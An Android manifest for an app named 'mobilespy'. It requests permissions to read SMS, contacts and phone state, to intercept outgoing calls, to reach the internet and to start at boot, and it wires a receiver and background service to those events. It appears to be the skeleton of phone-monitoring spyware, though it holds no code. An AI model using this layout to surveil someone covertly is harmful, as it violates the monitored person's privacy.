<?xml version="1.0" encoding="utf-8"?>

<manifest xmlns:android="http://schemas.android.com/apk/res/android"
	package="org.ddth.android.mobilespy" android:versionName="1.0"
	android:versionCode="1">
	<uses-sdk android:minSdkVersion="3" />

	<uses-permission android:name="android.permission.INTERNET" />
	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
	<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
	<!-- uses-permission android:name="android.permission.PROCESS_OUTGOING_SMS" /-->
	<uses-permission android:name="android.permission.READ_PHONE_STATE" />
	<uses-permission android:name="android.permission.RECEIVE_SMS" />
	<uses-permission android:name="android.permission.READ_CONTACTS" />
	<uses-permission android:name="android.permission.READ_SMS" />

	<application android:label="@string/application_name" android:theme="@style/Default" android:clearTaskOnLaunch="true">

		<activity android:name=".MobileSpyActivity" android:label="@string/application_name">
		</activity>
		
		<receiver android:name=".MobileSpyReceiver">
			<intent-filter>
				<action android:name="android.intent.action.BOOT_COMPLETED" />
				<action android:name="android.intent.action.USER_PRESENT" />
				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
				<action android:name="android.intent.action.PHONE_STATE" />
				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
			</intent-filter>
		</receiver>

		<service android:name=".MobileSpyService">
			<intent-filter>
				<action android:name="android.intent.action.MAIN" />
				<action android:name="android.intent.action.LAUNCHER" />
			</intent-filter>
		</service>

	</application>

</manifest>
